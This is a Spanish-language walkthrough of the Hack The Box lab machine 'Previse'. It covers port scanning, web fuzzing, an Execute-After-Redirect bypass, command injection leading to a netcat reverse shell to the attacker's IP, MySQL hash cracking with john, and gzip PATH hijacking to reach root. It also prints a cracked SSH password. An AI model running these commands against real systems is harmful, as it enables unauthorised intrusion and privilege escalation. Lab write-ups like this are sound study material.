---
title: Previse
published: true
categories: [Linux,Easy]
tags: [Web explotation, EAR, MySQL explotation, Path Hijacking]
author: Alejandro Rivera
image:
  path: https://user-images.githubusercontent.com/55555187/182441122-946b99b9-c0c0-45c6-91a7-c5d9dd9de9ae.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA

---

Previse es una <font color="#98E256">máquina Easy</font> de temática <font color="#D35400">Linux</font> en la que se toca EAR (Execute After Redirect) para crear un usuario válido en la web, OS Command Injection, lectura de credenciales válidas, explotación del servicio MySQL y Path Hijacking sobre el binario gzip.

## Reconocimiento y explotación

```bash
nmap -p- --open -sS --min-rate 10000 -Pn -n -vvv -oG portScan 10.10.11.104
```

![2022-07-31-12-15-56-image](https://user-images.githubusercontent.com/55555187/182440309-876ebe38-848f-4615-baa6-18f502983e1b.png)

```bash
nmap -sVC -p22,80 -oN portSV 10.10.11.104
```

![2022-07-31-12-16-49-image](https://user-images.githubusercontent.com/55555187/182440302-f2c19ee1-f2c6-4687-b60b-bf2a9ea5b690.png)

Me meto en la web y observo que los recursos tienen extensión .php, inicio un fuzzing para intentar enumerar información.

```bash
wfuzz -c --hc=404 -t 200 -H "User-Agent: Mozilla/5.0 (Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0" -w /usr/share/secLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.104/FUZZ
```

![2022-07-31-12-23-39-image](https://user-images.githubusercontent.com/55555187/182440301-27f98e4c-c527-4d97-97a8-673f2833daca.png)

De los resultados del fuzzing puedo sacar una serie de conclusiones:

1. Hay un config.php accesible (pero al ser php se interpreta y no vemos nada) que tendrá seguramente credenciales

2. Se producen muchas redirecciones lo que me indica que se comprueba si el usuario que hace la request es válido o no

Para terminar la enumeración inicial que siempre hago, intento buscar subdominios en la web Pero no encuentro ninguno.

```bash
wfuzz -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://10.10.11.104' -H "Host: FUZZ.10.10.11.104/" -H "User-Agent: Mozilla/5.0 (Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0"
```

Compruebo si *login.php* es vulnerable a SQLi pero no lo es. 

Revisando los recursos que me han dado 200 ok encuentro que en nav.php tengo acceso hacia los recursos que dan 302 aunque me siguen redirigiendo al login.

![2022-07-31-12-37-26-image](https://user-images.githubusercontent.com/55555187/182440299-2eca191a-d9f3-4694-a22f-98a10ac956f0.png)

Revisando las peticiones en el burp logro ver el panel de administración para la creación de usuarios:

![2022-07-31-12-52-20-image](https://user-images.githubusercontent.com/55555187/182440297-a73a88c0-16b0-44f3-b03f-909775492b49.png)

Lo que me hace pensar que aunque luego me redirija al login, puedo enviar una petición y crearme un usuario.

Cambio el método a POST y creo un usuario aportando los argumentos necesarios viendo los ids del formulario en la petición GET, lanzo la petición, me logueo como el usuario que acabo de crear y estoy dentro:

![2022-07-31-12-57-48-image](https://user-images.githubusercontent.com/55555187/182440290-9cfa041a-05d9-42a1-b879-870fc7d25394.png)

Una vez que tengo un usuario válido ya puedo ver las páginas que antes daban 302.

En *files.php* hay un zip con un backup del sitio por lo que me lo descargo y reviso su contenido.

![2022-07-31-12-58-40-image](https://user-images.githubusercontent.com/55555187/182440289-8b27d998-1445-4ac4-ba5f-42b2013192ff.png)

En el backup puedo ver el contenido de *config.php* obteniendo credenciales:

![2022-07-31-13-00-02-image](https://user-images.githubusercontent.com/55555187/182440287-3d938954-a67f-40bc-8d07-48e89b80f77b.png)

Como está SSH abierto pruebo por si hubiese reutilización de credenciales pero no es el caso.

En *file.php* también puedo subir ficheros lo que podría dar lugar a una *subida insegura de ficheros*.

Compruebo que puedo subir archivos php pero no hay un enlace para ver el contenido del fichero, solo para descargarlo por lo que no podría aprovecharme de esto.

Revisando los archivos de backup veo que en *logs.php* se está ejecutando **exec** y que se le pasa el **parámetro delim** sin sanitizar lo que pueda dar lugar a **RCE**.

![2022-07-31-13-28-52-image](https://user-images.githubusercontent.com/55555187/182440283-8af1140e-363f-4ed5-b4ca-9566b5076c1a.png)

Intento ver si puedo obtener por pantalla el output de algún comando para confirmar el RCE pero no obtengo nada.

Pruebo a hacer una comprobación levantando un servidor HTTP y realizando una petición contra él, obteniendo una respuesta y confirmando el RCE:

![2022-07-31-13-46-24-image](https://user-images.githubusercontent.com/55555187/182440280-6d682613-8507-412c-ab05-3f54c507d9fa.png)

Me entablo una reverse shell:

```bash
nc -e /bin/bash 10.10.14.3 443
```

![2022-07-31-13-46-36-image](https://user-images.githubusercontent.com/55555187/182440279-05503994-0c33-4b33-8a42-85837fcac550.png)

Hago un tratamiento de la TTY

```bash
script /dev/null -c bash
ctrl + z
stty raw -echo; fg
reset
xterm
export SHELL=bash
export TERM=xterm
```

## Escalada de privilegios

Una vez dentro hago un reconocimiento básico:

1. Existe el usuario m4lwhere en el sistema

2. Tenemos también una contraseña de *MySQL* del archivo *config.php*

3. No podemos ejecutar sudo en ningún contexto

4. En */opt/scripts* hay un archivo de root que al parecer se ejecuta en una tarea cron: 

![2022-07-31-18-21-21-image](https://user-images.githubusercontent.com/55555187/182440276-49c9bada-5020-4454-ab52-9c99967ee47f.png)

Teniendo credenciales para *MySQL*, trato de conectarme al servicio:

![2022-07-31-18-29-34-image](https://user-images.githubusercontent.com/55555187/182440274-2f0d460c-fbfe-4425-b376-6072861d5239.png)

Accedo al contenido de la base de datos *previse* y obtengo el hash de la contraseña del usuario *m4lwhere*:

![2022-07-31-18-30-31-image](https://user-images.githubusercontent.com/55555187/182440271-53674d02-a24f-46f2-aebe-7ea7beac0357.png)

Revisando *accounts.php* podemos ver como se ha creado este hash:

![2022-07-31-18-33-47-image](https://user-images.githubusercontent.com/55555187/182440269-412150c1-4ee2-4d35-9cf0-b531ba334320.png)

También buscando en internet podemos ver que <span>*$*</span>*1$* hace referencia a  *MD5*.

Listando los formatos de *john *podemos ver que existe el formato md5crypt que se ajusta a lo que hemos observado:

![2022-07-31-18-58-21-image](https://user-images.githubusercontent.com/55555187/182440266-37addc94-1e55-4961-b8a3-de4f975da23f.png)

```bash
john -format=md5crypt -wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![2022-07-31-19-07-43-image](https://user-images.githubusercontent.com/55555187/182440265-0a9268f3-396f-4a10-9e27-cbd2574e14e8.png)

Compruebo que la contraseña obtenida pertenezca a *m4lwhere*:

![2022-07-31-19-08-15-image](https://user-images.githubusercontent.com/55555187/182440262-be1a2bff-8b05-4466-8ecf-7187850f1bdd.png)

Aprovechando que el servicio *SSH* está abierto en la máquina, me logueo como m4lwhere a través de él.

```bash
sshpass -p 'ilovecody112235' ssh m4lwhere@10.10.11.104
```

![2022-07-31-19-11-36-image](https://user-images.githubusercontent.com/55555187/182440260-c75fc6af-e70e-443a-ab06-a0250bfc8a93.png)

Una vez dentro, busco archivos pertenecientes al grupo *m4lwhere* y encuentro uno que me llama la atención:

![2022-07-31-19-15-49-image](https://user-images.githubusercontent.com/55555187/182440259-95e4a25c-eb0b-4f04-bf3a-92584921288d.png)

Pero tras revisarlo no encuentro nada útil.

Compruebo si el usuario puede ejecutar comandos como Sudo en algún contexto y descubro que puede ejecutar el archivo .sh que tenía root en /opt/scripts:

![2022-07-31-19-37-31-image](https://user-images.githubusercontent.com/55555187/182440256-363afcbd-4813-4e05-9307-61dd62176650.png)

Revisando el contenido del archivo lo primero que me llama la atención es que se esté usando *gzip* sin establecer un path absoluto lo que puede dar lugar a *path hijacking*:

![2022-07-31-19-48-51-image](https://user-images.githubusercontent.com/55555187/182440247-f059c561-4aaf-4ac4-96df-9f26b589e303.png)

Para aprovechar esta vulnerabilidad:

1. Modifico la variable de entorno PATH de tal forma que el sistema operativo busque primero en */tmp*
   
   ```bash
   export PATH=/tmp:$PATH
   ```

2. Creo un archivo *gzip* en */tmp* y le doy permisos de ejecución con *chmod +x*

3. Compruebo que la vulnerabilidad está presente haciendo que el archivo *gzip* ejecute un *curl* contra un servidor HTTP que he levantado usando Python
   
   ![2022-07-31-19-48-33-image](https://user-images.githubusercontent.com/55555187/182440250-1cb1054a-e04d-43ed-a79c-68b1f74152d3.png)

4. Una vez que compruebo que la vulnerabilidad existe, cambio el payload y lanzo una reverse shell contra mi máquina la cual me dará una sesión como root al estar lanzandose el script con permisos de Sudo
   
   ![2022-07-31-19-51-18-image](https://user-images.githubusercontent.com/55555187/182440243-8a72ff61-49e5-4677-bff3-2d918f06478d.png)
